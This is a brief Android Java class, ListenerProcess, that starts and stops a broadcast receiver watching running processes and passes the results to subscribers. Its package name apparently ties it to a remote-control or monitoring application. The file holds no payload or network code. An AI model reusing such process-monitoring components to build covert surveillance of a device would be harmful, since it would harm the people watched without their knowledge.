package com.ht.RCSAndroidGUI.listener;

import java.util.ArrayList;

import android.app.ActivityManager.RunningAppProcessInfo;

import com.ht.RCSAndroidGUI.RunningProcesses;

public class ListenerProcess extends Listener<RunningProcesses> {
	/** The Constant TAG. */
	private static final String TAG = "ListenerProcess";

	private BroadcastMonitorProcess processReceiver;

	/** The singleton. */
	private volatile static ListenerProcess singleton;

	/**
	 * Self.
	 * 
	 * @return the status
	 */
	public static ListenerProcess self() {
		if (singleton == null) {
			synchronized (ListenerProcess.class) {
				if (singleton == null) {
					singleton = new ListenerProcess();
				}
			}
		}

		return singleton;
	}

	@Override
	protected void start() {
		processReceiver = new BroadcastMonitorProcess();
		processReceiver.start();
		processReceiver.register(this);
	}

	@Override
	protected void stop() {
		processReceiver.unregister();
		processReceiver = null;
	}
	
	@Override
	protected int dispatch(RunningProcesses processes){
		return super.dispatch(processes);
	}

}
